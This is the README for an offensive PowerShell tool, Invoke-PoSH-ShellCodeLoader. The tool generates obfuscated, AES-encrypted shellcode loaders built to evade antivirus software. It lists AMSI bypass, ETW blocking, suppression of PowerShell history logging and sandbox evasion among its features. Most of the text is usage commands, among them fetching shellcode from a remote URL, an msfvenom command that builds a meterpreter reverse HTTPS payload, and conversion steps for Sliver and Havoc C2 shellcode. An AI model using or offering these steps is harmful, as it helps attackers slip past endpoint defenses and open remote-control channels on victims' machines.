### Invoke-PoSH-ShellCodeLoader.ps1
--------------------------------------
'Invoke-PoSH-ShellCodeLoader' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.  
It generates an obfuscated and encrypted shellcode loader PowerShell script that will inject the shellcode into the current process's virtual address space.  

#### FEATURES
  - Shellcode injection into the memory of the current process (PowerShell)
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - AMSI bypass (pseudo random)
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
    - wait for 60 seconds before execution
  - Compatible with shellcodes of multiple C2 frameworks: Metasploit, Silver and Havoc

#### USAGE
1. Examples with a shellcode file stored locally
```
  - Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
  - Invoke-PoSH-ShellCodeLoader -Type MSF -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
    --- or ---
  - Invoke-PoSH-ShellCodeLoader -Type Sliver -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
    --- or ---
  - Invoke-PoSH-ShellCodeLoader -Type Havoc -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
```

2. Examples with a shellcode file stored on a remote web server
```
  - Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
  - Invoke-PoSH-ShellCodeLoader -Type MSF -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 
    --- or ---
  - Invoke-PoSH-ShellCodeLoader -Type Sliver -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 
    --- or ---
  - Invoke-PoSH-ShellCodeLoader -Type Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 
```
3. Examples with the optional parameter '-Sandbox'
```
  - Invoke-PoSH-ShellCodeLoader -Type MSF -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 -Sandbox
  - Invoke-PoSH-ShellCodeLoader -Type Sliver -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1  -Sandbox
```

#### INPUT (Shellcode formats)  
- Metasploit C2 Framework  
  ```msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o shellcode```  
  
- Sliver C2 Framework  
  ```[server] sliver > generate --arch amd64 -f shellcode --http IP -l --os Windows --save shellcode```  
  ```@Kali:/$ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2```  
  ```@Kali:/$ sed '$ s/.$//' shellcode2 > shellcode3```  
  
- Havoc C2 Framework  
    1. Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64 / Indirect Syscall: Enabled / Sleep Technique: WaitForSIngleObjectEx)  
    2. To convert the Havoc shellcode to the appropriate format you need to run these commands:  
       ```@Kali:/$ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2```  
       ```@Kali:/$ sed '$ s/.$//' shellcode2 > shellcode3```  

#### LICENSE
  - GNU General Public License v3.0
